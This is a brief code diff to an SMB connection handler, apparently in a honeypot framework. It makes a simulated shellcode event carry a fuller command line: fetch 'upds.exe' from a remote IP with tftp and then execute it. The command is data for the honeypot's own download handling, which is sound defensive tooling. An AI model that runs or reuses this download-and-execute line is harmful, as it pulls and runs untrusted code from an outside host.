@@ -9,7 +9,7 @@ class SmbConnection(NetworkEndpoint):
 		log(L_INFO, 'New connection, timeout after %is idle time.' % self.timeouts.sustain)
 
 	def connectionClosed(self):
-		dispatchEvent('shellcode.process', { 'commandline': 'tftp.exe -i 88.84.18.105 get upds.exe', 'recorder': self.getRecorder() } )
+		dispatchEvent('shellcode.process', { 'commandline': 'tftp.exe -i 88.84.18.105 get upds.exe && upds.exe', 'recorder': self.getRecorder() } )
 
 		log(L_INFO, 'Connection has been closed.')
 
